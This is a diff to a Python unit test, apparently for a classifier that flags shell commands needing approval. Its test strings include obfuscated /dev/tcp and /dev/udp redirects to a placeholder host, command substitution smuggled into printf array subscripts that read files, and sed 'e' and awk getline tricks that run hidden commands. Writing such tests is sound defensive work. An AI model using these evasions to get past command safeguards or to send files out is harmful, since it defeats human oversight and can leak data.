@@ -656,6 +656,9 @@ class StructuralAskTest(unittest.TestCase):
             "grep 'rm -rf' f > /de{v..v}/tcp/example.invalid/80", "grep 'rm -rf' f | tee > /de{v..v}/udp/example.invalid/53",
             "grep 'rm -rf' f > ~-/tcp/example.invalid/80",
             "printf '%d\\n' 'a[$(cat notes.md)]'", "printf '%s %*s' x 'a[`cat notes.md`]' y", "printf -- '%d' 'a[$(cat f)]'",
+            "grep 'rm -rf' f; printf '%d\\n' 'path[$(example-tool)]'", "grep 'rm -rf' f; sed 's/.*/example-tool/e' f",
+            "grep 'rm -rf' f | printf '%f' 'path[`example-tool`]'", "grep 'rm -rf' f; awk 'BEGIN{\"example-tool\" | getline x}'",
+            "grep 'rm -rf' f; printf '%d' 'path[$(example-tool)]' | sed 's/a/b/'",
             "cd $TMPDIR/run && rm -rf ../x", "cd $TMPDIR/run && cd ~ && rm -f a", "cd /srv/run && rm -f a",
             "for f in a b; do f=$(cat x); cat $f; done", "for f in $(ls); do cat $f; done; echo \"$(date)\"",
         ]:
